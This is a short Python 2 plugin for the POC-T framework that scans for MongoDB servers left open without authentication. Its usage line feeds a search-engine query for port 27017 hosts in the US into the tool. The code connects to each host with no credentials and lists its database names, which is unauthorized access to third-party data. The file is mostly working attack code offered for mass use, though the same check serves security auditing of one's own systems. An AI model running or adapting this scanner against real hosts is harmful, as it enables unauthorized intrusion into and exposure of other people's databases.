#!/usr/bin/python
# -*- coding: UTF-8 -*-
# project = https://github.com/Xyntax/POC-T
# author Double8


"""
moogodb未授权访问

Usage:
  python POC-T.py -s mongodb-unauth -aZ "port:27017 country:us"

"""


import socket
import sys
import pymongo
from plugin.util import host2IP
from plugin.util import checkPortTcp

def poc(url):
	url = host2IP(url)
	ip = url.split(':')[0]
	try:
		if not checkPortTcp(ip,27017):
			return False
		if testConnect(ip,27017):
			return ip
	except Exception,e:
		return False
	return False

def testConnect(ip,port=27017):
	global dbname
	try:
		conn = pymongo.MongoClient(ip,27017,socketTimeoutMS=3000)
		dbname = conn.database_names()
		#print dbname
		if dbname:
			return True
	except Exception,e:
		return False











